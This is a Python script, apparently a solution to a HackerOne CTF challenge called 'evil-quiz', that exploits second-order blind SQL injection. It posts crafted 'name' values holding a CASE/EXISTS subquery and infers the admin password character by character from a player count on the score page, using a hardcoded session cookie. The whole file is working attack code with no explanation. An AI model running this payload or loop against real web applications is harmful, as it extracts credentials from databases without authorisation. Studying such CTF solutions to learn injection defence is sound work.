"""https://medium.com/bugbountywriteup/exploiting-second-order-blind-sql-injection-689e98f04daa"""
import requests,time,re

charlists= ['0','1','2','3','4','5','6','7','8','9','0','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_','{','}','-','$','!','@','#']
URL = "https://hackyholidays.h1ctf.com/evil-quiz/"
password = ""
headers = {'Cookie': 'session=49760dc697484323f6057689d396b3f8'}
data = {'name' : 'test'}
r = requests.post(url = URL , data = data, headers = headers)
for i in range(1,18):
   for x in charlists:
        data = {'name': '\' and (SELECT (CASE WHEN EXISTS(SELECT username FROM admin where username = \'admin\' and BINARY substring(password,'+str(i)+',1) = \'' + str(x) + '\')  then 1 else 0 end)) = 1 # '} 
        r = requests.post(url = URL, data = data, headers = headers)
        out = requests.get(url = URL + "score", headers = headers)

        result = re.search('There is (.*) other player',out.text)
        if int(result.group(1)) > 0:
            password += str(x)
            print("Give me password plaease ::-> " + password)
            break
        else:
            pass